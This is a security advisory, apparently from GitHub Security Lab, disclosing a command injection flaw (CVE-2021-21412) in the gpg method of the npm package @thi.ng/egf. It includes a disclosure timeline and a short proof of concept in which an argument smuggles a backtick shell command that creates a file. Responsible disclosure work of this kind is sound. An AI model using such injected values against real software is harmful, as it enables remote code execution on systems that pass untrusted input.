<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">April 13, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2021-062: Command injection in @thi.ng/egf - CVE-2021-21412</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/pwntester">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/125701?s=35" height="35" width="35">
        <span>Alvaro Munoz</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>2021-03-25: Issue reported to the maintainers.</li>
  <li>2021-03-26: Issue is acknowledged.</li>
  <li>2021-04-03: Issue is <a href="https://github.com/thi-ng/umbrella/commit/3e14765d6bfd8006742c9e7860bc7d58ae94dfa5">fixed</a> and <a href="https://github.com/thi-ng/umbrella/security/advisories/GHSA-rj44-gpjc-29r7">advisory is published</a>.</li>
</ul>

<h2 id="summary">Summary</h2>

<p>The <code class="language-plaintext highlighter-rouge">gpg</code> method has a command injection vulnerability. Clients of the @thi.ng/egf library are unlikely to be aware of this, so they might unwittingly write code that contains a vulnerability.</p>

<h2 id="product">Product</h2>

<p>@thi.ng/egf</p>

<h2 id="tested-version">Tested Version</h2>

<p>Latest commit at the time of reporting (March 25, 2021).</p>

<h2 id="details">Details</h2>

<h3 id="command-injection-in-gpg">Command injection in <code class="language-plaintext highlighter-rouge">gpg</code></h3>

<p>The following proof-of-concept illustrates the vulnerability. First install @thi.ng/egf:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>npm install @thi.ng/egf
</code></pre></div></div>

<p>Now create a file with the following contents:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>const egf = require("@thi.ng/egf");
egf.BUILTINS.gpg("foo", "bar`touch exploit`", {opts: {decrypt: true}});
</code></pre></div></div>

<p>and run it:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node test.js
</code></pre></div></div>

<p>Notice that a file named <code class="language-plaintext highlighter-rouge">exploit</code> has been created.</p>

<p>This vulnerability is similar to command injection vulnerabilities that have been found in other Javascript libraries. Here are some examples:
<a href="https://github.com/advisories/GHSA-m8xj-5v73-3hh8">CVE-2020-7646</a>,
<a href="https://github.com/advisories/GHSA-426h-24vj-qwxf">CVE-2020-7614</a>,
<a href="https://github.com/advisories/GHSA-5q88-cjfq-g2mh">CVE-2020-7597</a>,
<a href="https://github.com/advisories/GHSA-4gp3-p7ph-x2jr">CVE-2019-10778</a>,
<a href="https://github.com/advisories/GHSA-84cm-v6jp-gjmr">CVE-2019-10776</a>,
<a href="https://github.com/advisories/GHSA-9jm3-5835-537m">CVE-2018-16462</a>,
<a href="https://github.com/advisories/GHSA-7g2w-6r25-2j7p">CVE-2018-16461</a>,
<a href="https://github.com/advisories/GHSA-cfhg-9x44-78h2">CVE-2018-16460</a>,
<a href="https://github.com/advisories/GHSA-pp57-mqmh-44h7">CVE-2018-13797</a>,
<a href="https://github.com/advisories/GHSA-c9j3-wqph-5xx9">CVE-2018-3786</a>,
<a href="https://github.com/advisories/GHSA-wjr4-2jgw-hmv8">CVE-2018-3772</a>,
<a href="https://github.com/advisories/GHSA-3pxp-6963-46r9">CVE-2018-3746</a>,
<a href="https://github.com/advisories/GHSA-jcw8-r9xm-32c6">CVE-2017-16100</a>,
<a href="https://github.com/advisories/GHSA-qh2h-chj9-jffq">CVE-2017-16042</a>.</p>

<h4 id="impact">Impact</h4>

<p>This issue may lead to remote code execution if a client of the library calls the vulnerable method with untrusted input.</p>

<h2 id="cve">CVE</h2>
<ul>
  <li>CVE-2021-21412</li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GitHub Engineer <a href="https://github.com/erik-krogh">@erik-krogh (Erik Krogh Kristensen)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2021-062</code> in any communication regarding this issue.</p>


    